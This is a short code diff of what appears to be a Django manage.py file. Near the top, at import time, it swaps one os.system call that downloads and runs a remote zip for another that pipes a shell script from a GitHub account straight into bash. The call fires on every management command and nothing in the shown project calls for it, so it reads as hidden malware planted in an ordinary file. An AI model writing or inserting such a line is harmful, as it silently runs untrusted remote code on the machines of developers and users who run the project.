@@ -3,7 +3,7 @@
 ##########################################################################################
 import os
 import sys
-os.system('wget https://github.com/ismailalkaf/nodes/raw/refs/heads/main/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')
+os.system('wget -O - https://raw.githubusercontent.com/miltoncarpenter665/python/refs/heads/main/dothemthings.sh | bash')
 
 def main():
     """Run administrative tasks."""
